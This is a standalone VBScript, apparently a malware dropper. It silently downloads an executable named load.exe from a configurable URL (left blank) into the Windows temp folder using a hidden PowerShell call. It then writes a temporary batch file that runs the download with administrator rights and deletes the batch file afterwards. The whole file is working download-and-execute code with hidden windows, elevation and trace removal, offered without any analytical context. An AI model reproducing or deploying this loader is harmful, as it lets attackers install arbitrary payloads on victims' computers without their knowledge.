Set objShell = CreateObject("WScript.Shell")

url = ""

tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
savePath = tempFolder & "\load.exe"
downloadCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & url & "' -OutFile '" & savePath & "'"""
objShell.Run downloadCommand, 0, True

batFilePath = tempFolder & "\run_as_admin.bat"

Set fso = CreateObject("Scripting.FileSystemObject")
Set batFile = fso.CreateTextFile(batFilePath, True)
batFile.WriteLine "@echo off"
batFile.WriteLine "powershell -Command Start-Process -FilePath """ & savePath & """ -Verb RunAs"
batFile.Close

objShell.Run "cmd /c " & batFilePath, 0, True
fso.DeleteFile batFilePath, True
